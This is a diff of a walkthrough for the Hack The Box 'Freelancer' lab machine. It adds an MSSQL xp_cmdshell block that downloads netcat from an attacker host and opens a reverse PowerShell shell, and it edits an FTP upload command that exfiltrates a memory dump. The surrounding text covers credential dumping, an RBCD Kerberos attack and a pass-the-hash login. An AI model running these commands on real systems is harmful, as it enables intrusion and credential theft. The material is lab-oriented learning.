@@ -185,6 +185,16 @@ We have access to a SQL terminal under `Development Tools`. We can use it to exe
 
 > We get the `netcat` binary for Windows [here](https://github.com/andrew-d/static-binaries/tree/master/binaries/windows/x86), set up a Python web server to drop it on the target and gain our reverse shell by executing it.
 
+```SQL
+EXECUTE AS LOGIN = 'sa';
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXECUTE xp_cmdshell "powershell.exe wget http://YOUR_IP/ncat.exe -OutFile C:\temp\nc.exe"
+EXECUTE xp_cmdshell "powershell.exe C:\temp\nc.exe YOUR_IP PORT_NUMBER -e powershell"
+```
+
 ![SQL reverse shell](/images/HTB-Freelancer/sql_revshell.png)
 
 We now have a shell as `sql_svc`.
@@ -225,7 +235,7 @@ On the Desktop we find the user flag and two other files `mail.txt` and `MEMORY.
 
 ![mickasaackerman desktop](/images/HTB-Freelancer/user_flag.png)
 
-Thanks to the txt file we learn that the `MEMORY.7z` file is a memory dump, we will send it to our local machine for further examination.
+Thanks to `mail.txt` we learn that `MEMORY.7z` contains a full memory dump which we will send to our local machine for further examination.
 
 ![mickasaackerman mail](/images/HTB-Freelancer/mail_to_mikasa.png)
 
@@ -242,14 +252,14 @@ sudo python3 -m pyftpdlib --port 21 --write
 On the target we run
 
 ```
-(New-Object Net.WebClient).UploadFile('ftp://10.10.14.182/MEMORY.7z', 'C:\Users\mikasaAckerman\Desktop\MEMORY.7z')
+(New-Object Net.WebClient).UploadFile('ftp://YOUR_IP/MEMORY.7z', 'C:\Users\mikasaAckerman\Desktop\MEMORY.7z')
 ```
 
 ![MEMORY.7z File upload](/images/HTB-Freelancer/file_upload.png)
 
 After a few minutes we get the archive, extract it with `7z x MEMORY.7z` and end up with a file called `MEMORY.DMP`.
 
-> You can install the tool with `sudo apt-get install p7zip-full`.
+> You can install 7z with `sudo apt-get install p7zip-full`.
 
 ![Memory dump file](/images/HTB-Freelancer/memory_dump_file.png)
 
@@ -275,9 +285,9 @@ We need to be root in order to access the mounted directory.
 
 In `/mnt/memprocfs/registry/hive_files` we find the raw Windows registry hive files extracted from the memory dump. From here, we will use the files necessary to find some credentials:
 
-* SAM (Security Account Manager): This hive contains information about the user accounts and the hashed passwords for local users.
-* SYSTEM: It usually contains system information such as driver configurations, hardware settings etc. Additionally it also holds the key needed to decrypt passwords stored in the SAM hive.
-* SECURITY: All the information about security is stored here including rights assignments, account policies, and encrypted LSA secrets (which might have cached domain credentials and other sensitive data).
+* **SAM (Security Account Manager)**: This hive contains information about the user accounts and the hashed passwords for local users.
+* **SYSTEM**: It usually contains system information such as driver configurations, hardware settings etc. Additionally it also holds the key needed to decrypt passwords stored in the SAM hive.
+* **SECURITY**: All the information about security is stored here including rights assignments, account policies, and encrypted LSA secrets (which might have cached domain credentials and other sensitive data).
 
 ![hive files list](/images/HTB-Freelancer/hive_files.png)
 
@@ -332,7 +342,7 @@ We can restore the object by using its `ObjectGUID`.
 Restore-ADObject -identity "ebe15df5-e265-45ec-b7fc-359877217138"
 ```
 
-> I am not sure how/if it is possible to get to root after restoring liza kazanof account. I will update this part if I find an exploitation path for it. 
+> I am not sure how/if it is possible to get to root from the liza kazanof account. I will update this part if I find an exploitation path for it. 
 
 The members of `AD Recycle Bin` have the `GenericWrite` permission on the domain controller which we can use to exploit the target via resource-based constrained delegation (RBCD). _Read more about it [here](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)_.
 
@@ -360,7 +370,7 @@ impacket-rbcd -delegate-from 'KSCORPIO$' -delegate-to 'DC$' -dc-ip 10.10.11.5 -a
 faketime -f +5h impacket-getST -spn 'cifs/dc.freelancer.htb' -impersonate Administrator -dc-ip 10.10.11.5 freelancer.htb/KSCORPIO$:'LETSgetr00t!'
 ```
 
-> the SPN `cifs/dc.freelancer.htb` indicates that we want to authenticate to the file sharing service on the domain controller. The CIFS service is essentially an extension of the SMB protocol. _Read more about it [here](https://www.upguard.com/blog/cifs)._
+> The SPN `cifs/dc.freelancer.htb` indicates that we want to authenticate to the file sharing service on the domain controller. The CIFS service is essentially an extension of the SMB protocol. _Read more about it [here](https://www.upguard.com/blog/cifs)._
 
 ![Kerberos ticket](/images/HTB-Freelancer/Kerberos_ticket.png)
 
@@ -382,7 +392,7 @@ faketime -f +5h impacket-secretsdump 'freelancer.htb/Administrator@DC.freelancer
 
 ![Kerberos ticket](/images/HTB-Freelancer/hashes_list.png)
 
-6. We can now login with the Administrator hash using evil-winrm and the root flag is on the Desktop.
+6. Finally, we login with the Administrator hash using evil-winrm and the root flag is on the Desktop.
 
 ```
 evil-winrm -i freelancer.htb -u administrator -H '0039318f1e8274633445bce32ad1a290'
